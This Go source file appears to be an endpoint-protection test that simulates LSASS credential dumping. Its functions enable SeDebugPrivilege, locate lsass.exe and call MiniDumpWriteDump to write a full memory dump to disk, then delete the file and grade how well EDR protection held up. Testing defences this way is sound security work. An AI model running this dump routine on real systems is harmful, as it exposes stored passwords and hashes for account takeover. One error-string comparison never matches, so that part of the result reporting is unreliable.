//go:build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	cert_installer "github.com/preludeorg/libraries/go/tests/cert_installer"
	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
	"golang.org/x/sys/windows"
)

const (
	testUUID = "931f91ef-c7c0-4c3c-b61b-03992edb5e5f"
	testName = "LSASS Memory Dump via MiniDumpWriteDump"
)

// Windows constants and structures
const (
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_READ           = 0x0010
	MiniDumpWithFullMemory    = 0x00000002
	SE_DEBUG_NAME             = "SeDebugPrivilege"
)

var (
	dbghelp                = windows.NewLazySystemDLL("dbghelp.dll")
	procMiniDumpWriteDump  = dbghelp.NewProc("MiniDumpWriteDump")
	advapi32               = windows.NewLazySystemDLL("advapi32.dll")
	procLookupPrivilegeValue = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
)

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

// enableSeDebugPrivilege attempts to enable SeDebugPrivilege for the current process
func enableSeDebugPrivilege() error {
	var token windows.Token
	currentProcess, err := windows.GetCurrentProcess()
	if err != nil {
		return fmt.Errorf("failed to get current process: %v", err)
	}

	err = windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("failed to open process token: %v", err)
	}
	defer token.Close()

	var luid LUID
	privilegeName, err := syscall.UTF16PtrFromString(SE_DEBUG_NAME)
	if err != nil {
		return fmt.Errorf("failed to convert privilege name: %v", err)
	}

	ret, _, err := procLookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(privilegeName)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValue failed: %v", err)
	}

	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	ret, _, err = procAdjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0,
		0,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges failed: %v", err)
	}

	return nil
}

// findLsassPID finds the process ID of lsass.exe
func findLsassPID() (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	err = windows.Process32First(snapshot, &procEntry)
	if err != nil {
		return 0, fmt.Errorf("Process32First failed: %v", err)
	}

	for {
		exeFile := windows.UTF16ToString(procEntry.ExeFile[:])
		if exeFile == "lsass.exe" {
			return procEntry.ProcessID, nil
		}

		err = windows.Process32Next(snapshot, &procEntry)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("lsass.exe process not found")
}

// attemptLsassDump attempts to dump LSASS memory using MiniDumpWriteDump
func attemptLsassDump(lsassPID uint32, dumpPath string) error {
	// Open handle to LSASS process
	handle, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, lsassPID)
	if err != nil {
		return fmt.Errorf("OpenProcess failed (access denied): %v", err)
	}
	defer windows.CloseHandle(handle)

	// Create dump file
	dumpFile, err := os.Create(dumpPath)
	if err != nil {
		return fmt.Errorf("failed to create dump file: %v", err)
	}
	defer dumpFile.Close()

	// Call MiniDumpWriteDump
	ret, _, err := procMiniDumpWriteDump.Call(
		uintptr(handle),
		uintptr(lsassPID),
		dumpFile.Fd(),
		uintptr(MiniDumpWithFullMemory),
		0,
		0,
		0,
	)

	if ret == 0 {
		return fmt.Errorf("MiniDumpWriteDump failed: %v", err)
	}

	return nil
}

func test() {
	// Initialize logger
	InitLogger(testUUID, testName)
	defer func() {
		if r := recover(); r != nil {
			LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic: %v", r))
			SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Panic: %v", r))
		}
	}()

	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("F0RT1KA Security Test")
	Endpoint.Say("=================================================================")
	Endpoint.Say("Test: %s", testName)
	Endpoint.Say("UUID: %s", testUUID)
	Endpoint.Say("MITRE ATT&CK: T1003.001 (OS Credential Dumping: LSASS Memory)")
	Endpoint.Say("=================================================================")
	Endpoint.Say("")

	// Gather system information
	GatherSystemInfo()

	// Phase 1: Check prerequisites
	LogPhaseStart(1, "Prerequisites Check")
	Endpoint.Say("")
	Endpoint.Say("Phase 1: Checking Prerequisites")
	Endpoint.Say("-----------------------------------------------------------------")

	// Check if running as Administrator
	isAdmin := windows.GetCurrentProcessToken().IsElevated()
	if !isAdmin {
		Endpoint.Say("❌ ERROR: Test requires Administrator privileges")
		LogPhaseError(1, "Not running as Administrator")
		SaveLog(Endpoint.UnexpectedTestError, "Test requires Administrator privileges")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("✅ Running as Administrator")
	LogMessage("INFO", "Prerequisites", "Running with Administrator privileges")
	LogPhaseEnd(1, "success", "Prerequisites check passed")

	// Phase 2: Enable SeDebugPrivilege
	LogPhaseStart(2, "Enable SeDebugPrivilege")
	Endpoint.Say("")
	Endpoint.Say("Phase 2: Attempting to Enable SeDebugPrivilege")
	Endpoint.Say("-----------------------------------------------------------------")
	Endpoint.Say("SeDebugPrivilege allows access to sensitive system processes")

	debugPrivilegeEnabled := false
	err := enableSeDebugPrivilege()
	if err != nil {
		Endpoint.Say("⚠️  WARNING: Failed to enable SeDebugPrivilege: %v", err)
		Endpoint.Say("    This may indicate EDR protection or policy restriction")
		LogPhaseError(2, fmt.Sprintf("SeDebugPrivilege elevation failed: %v", err))
	} else {
		Endpoint.Say("✅ SeDebugPrivilege enabled successfully")
		LogMessage("INFO", "Privileges", "SeDebugPrivilege enabled")
		debugPrivilegeEnabled = true
		LogPhaseEnd(2, "success", "SeDebugPrivilege enabled")
	}

	// Phase 3: Locate LSASS process
	LogPhaseStart(3, "Locate LSASS Process")
	Endpoint.Say("")
	Endpoint.Say("Phase 3: Locating LSASS Process")
	Endpoint.Say("-----------------------------------------------------------------")

	lsassPID, err := findLsassPID()
	if err != nil {
		Endpoint.Say("❌ ERROR: Failed to find lsass.exe process: %v", err)
		LogPhaseError(3, fmt.Sprintf("LSASS process not found: %v", err))
		SaveLog(Endpoint.UnexpectedTestError, "Failed to find LSASS process")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	Endpoint.Say("✅ Found lsass.exe (PID: %d)", lsassPID)
	LogMessage("INFO", "Discovery", fmt.Sprintf("LSASS process found with PID: %d", lsassPID))
	LogPhaseEnd(3, "success", fmt.Sprintf("Located lsass.exe at PID %d", lsassPID))

	// Phase 4: Attempt LSASS memory dump
	LogPhaseStart(4, "LSASS Memory Dump Attempt")
	Endpoint.Say("")
	Endpoint.Say("Phase 4: Attempting LSASS Memory Dump")
	Endpoint.Say("-----------------------------------------------------------------")
	Endpoint.Say("This simulates credential theft via LSASS memory access")
	Endpoint.Say("")

	targetDir := "c:\\F0"
	os.MkdirAll(targetDir, 0755)
	dumpPath := filepath.Join(targetDir, "lsass.dmp")

	Endpoint.Say("Target dump file: %s", dumpPath)
	Endpoint.Say("")
	Endpoint.Say("Attempting to:")
	Endpoint.Say("  1. Open handle to lsass.exe (PID: %d)", lsassPID)
	Endpoint.Say("  2. Call MiniDumpWriteDump API")
	Endpoint.Say("  3. Write memory dump to disk")
	Endpoint.Say("")

	dumpStartTime := time.Now()
	err = attemptLsassDump(lsassPID, dumpPath)
	dumpDuration := time.Since(dumpStartTime)

	dumpSucceeded := false
	handleOpened := false
	dumpCreated := false

	if err != nil {
		Endpoint.Say("⚠️  LSASS dump attempt failed: %v", err)
		Endpoint.Say("   Duration: %v", dumpDuration)
		LogPhaseError(4, fmt.Sprintf("LSASS dump failed: %v (duration: %v)", err, dumpDuration))

		// Check if we even got a handle
		if err.Error() == "OpenProcess failed (access denied)" {
			Endpoint.Say("")
			Endpoint.Say("🛡️  EDR PROTECTION: OpenProcess was denied")
			Endpoint.Say("   System prevented handle acquisition to lsass.exe")
			handleOpened = false
		} else {
			Endpoint.Say("")
			Endpoint.Say("⚠️  Partial success: Handle obtained but dump blocked")
			handleOpened = true
		}
	} else {
		Endpoint.Say("⚠️  CRITICAL: LSASS memory dump succeeded!")
		Endpoint.Say("   Duration: %v", dumpDuration)

		// Verify dump file was created
		fileInfo, statErr := os.Stat(dumpPath)
		if statErr == nil && fileInfo.Size() > 0 {
			Endpoint.Say("   Dump file size: %d bytes", fileInfo.Size())
			LogFileDropped("lsass.dmp", dumpPath, fileInfo.Size(), false)
			dumpCreated = true
			dumpSucceeded = true
		}

		LogPhaseEnd(4, "success", fmt.Sprintf("LSASS dump created (%d bytes)", fileInfo.Size()))
		handleOpened = true
	}

	// Phase 5: Cleanup
	LogPhaseStart(5, "Cleanup")
	Endpoint.Say("")
	Endpoint.Say("Phase 5: Cleanup")
	Endpoint.Say("-----------------------------------------------------------------")

	if dumpCreated {
		os.Remove(dumpPath)
		Endpoint.Say("✅ Removed dump file: %s", dumpPath)
		LogMessage("INFO", "Cleanup", "Dump file removed")
	}

	LogPhaseEnd(5, "success", "Cleanup completed")

	// Final Evaluation
	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("FINAL EVALUATION: Analyzing Protection Effectiveness")
	Endpoint.Say("=================================================================")
	Endpoint.Say("")

	var finalExitCode int
	var finalReason string

	if dumpSucceeded {
		// Attack succeeded - system is vulnerable
		Endpoint.Say("❌ RESULT: VULNERABLE")
		Endpoint.Say("=================================================================")
		Endpoint.Say("CRITICAL: System failed to prevent LSASS memory dump")
		Endpoint.Say("")
		Endpoint.Say("Attack Chain:")
		Endpoint.Say("  ✓ SeDebugPrivilege: %v", debugPrivilegeEnabled)
		Endpoint.Say("  ✓ LSASS PID Discovery: Success (PID: %d)", lsassPID)
		Endpoint.Say("  ✓ OpenProcess: Success (handle obtained)")
		Endpoint.Say("  ✓ MiniDumpWriteDump: Success (memory dumped)")
		Endpoint.Say("")
		Endpoint.Say("Security Impact:")
		Endpoint.Say("  • Credentials in memory could be extracted")
		Endpoint.Say("  • Domain admin passwords potentially compromised")
		Endpoint.Say("  • Lateral movement risk elevated")
		Endpoint.Say("")
		Endpoint.Say("IMMEDIATE ACTION REQUIRED:")
		Endpoint.Say("  • Review EDR LSASS protection settings")
		Endpoint.Say("  • Enable Credential Guard if available")
		Endpoint.Say("  • Investigate EDR policy configuration")
		Endpoint.Say("=================================================================")

		finalExitCode = Endpoint.Unprotected
		finalReason = "System vulnerable - LSASS memory dump succeeded"

	} else if !handleOpened {
		// EDR blocked at earliest stage - well protected
		Endpoint.Say("✅ RESULT: PROTECTED (Strong)")
		Endpoint.Say("=================================================================")
		Endpoint.Say("System successfully prevented LSASS access")
		Endpoint.Say("")
		Endpoint.Say("Protection Details:")
		Endpoint.Say("  • OpenProcess denied - no handle obtained")
		Endpoint.Say("  • Attack stopped at earliest possible stage")
		Endpoint.Say("  • LSASS process remains protected")
		Endpoint.Say("")
		Endpoint.Say("Attack Chain Interrupted:")
		Endpoint.Say("  %s SeDebugPrivilege: %v", getStatusSymbol(debugPrivilegeEnabled), debugPrivilegeEnabled)
		Endpoint.Say("  ✓ LSASS PID Discovery: Success (PID: %d)", lsassPID)
		Endpoint.Say("  ✗ OpenProcess: BLOCKED (EDR protection)")
		Endpoint.Say("  - MiniDumpWriteDump: Not reached")
		Endpoint.Say("")
		Endpoint.Say("Security Status: ENDPOINT IS SECURE")
		Endpoint.Say("=================================================================")

		finalExitCode = Endpoint.ExecutionPrevented
		finalReason = "System protected - OpenProcess denied to LSASS"

	} else {
		// Handle obtained but dump failed - partial protection
		Endpoint.Say("✅ RESULT: PROTECTED")
		Endpoint.Say("=================================================================")
		Endpoint.Say("System prevented LSASS memory dump")
		Endpoint.Say("")
		Endpoint.Say("Protection Details:")
		Endpoint.Say("  • OpenProcess succeeded (handle obtained)")
		Endpoint.Say("  • MiniDumpWriteDump blocked by EDR")
		Endpoint.Say("  • Memory dump prevented")
		Endpoint.Say("")
		Endpoint.Say("Attack Chain Interrupted:")
		Endpoint.Say("  %s SeDebugPrivilege: %v", getStatusSymbol(debugPrivilegeEnabled), debugPrivilegeEnabled)
		Endpoint.Say("  ✓ LSASS PID Discovery: Success (PID: %d)", lsassPID)
		Endpoint.Say("  ✓ OpenProcess: Success (handle obtained)")
		Endpoint.Say("  ✗ MiniDumpWriteDump: BLOCKED (EDR protection)")
		Endpoint.Say("")
		Endpoint.Say("Note: While handle acquisition succeeded, the critical")
		Endpoint.Say("      memory dump operation was blocked by EDR")
		Endpoint.Say("")
		Endpoint.Say("Security Status: ENDPOINT IS SECURE")
		Endpoint.Say("=================================================================")

		finalExitCode = Endpoint.ExecutionPrevented
		finalReason = "System protected - MiniDumpWriteDump blocked"
	}

	Endpoint.Say("")
	SaveLog(finalExitCode, finalReason)
	Endpoint.Stop(finalExitCode)
}

func getStatusSymbol(success bool) string {
	if success {
		return "✓"
	}
	return "✗"
}

func main() {
	// Initialize dropper
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	// MANDATORY: Pre-flight certificate check (self-healing deployment)
	Endpoint.Say("Pre-flight: Checking F0RT1KA certificate...")
	if err := cert_installer.EnsureCertificateInstalled(); err != nil {
		Endpoint.Say("❌ FATAL: Certificate installation failed: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("✅ F0RT1KA certificate verified")

	// Run test
	test()
}
